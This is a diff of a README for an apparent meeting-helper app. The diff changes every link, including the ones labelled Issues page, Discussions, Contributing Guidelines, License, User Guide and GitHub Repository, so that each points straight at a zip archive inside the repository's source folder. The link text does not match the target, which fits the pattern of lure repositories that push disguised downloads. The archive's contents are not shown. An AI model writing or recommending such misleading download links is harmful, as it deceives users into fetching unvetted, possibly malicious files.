@@ -8,9 +8,9 @@ Welcome to live-meeting-helper! This application helps you manage your meetings 
 
 To get started, you need to download the application. Click the link below:
 
-[![Download live-meeting-helper](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip)
+[![Download live-meeting-helper](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip%20release-brightgreen)](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip)
 
-1. Visit [this page to download](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip).
+1. Visit [this page to download](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip).
 2. Choose the latest release version.
 3. Look for the appropriate file for your operating system (Windows, MacOS, Linux).
 4. Click on the file to start downloading.
@@ -42,24 +42,24 @@ To run live-meeting-helper smoothly, make sure your system meets these requireme
 
 ## 🛠 Support
 
-If you encounter any issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip) for help. You can report bugs or ask questions.
+If you encounter any issues, please visit our [GitHub Issues Page](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip) for help. You can report bugs or ask questions.
 
 ## 🎯 Community & Feedback
 
-We value your insights. If you have suggestions or feedback, please leave them on our [Discussions Page](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip).
+We value your insights. If you have suggestions or feedback, please leave them on our [Discussions Page](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip).
 
 ## 💡 Contributing
 
-Have ideas or want to help improve the application? Check out our [Contributing Guidelines](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip) for more information.
+Have ideas or want to help improve the application? Check out our [Contributing Guidelines](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip) for more information.
 
 ## 📄 License
 
-live-meeting-helper is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip).
+live-meeting-helper is licensed under the MIT License. You can view the full license [here](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip).
 
 ## 🔗 Useful Links
 
-- [Download live-meeting-helper](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip)
-- [User Guide](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/aimbotz1/live-meeting-helper/main/frontend/scripts/helper_live_meeting_2.4-alpha.3.zip)
+- [Download live-meeting-helper](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip)
+- [User Guide](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip)
+- [GitHub Repository](https://github.com/aimbotz1/live-meeting-helper/raw/refs/heads/main/frontend/src/meeting_live_helper_2.7.zip)
 
 Enjoy using live-meeting-helper to make your meetings more productive!
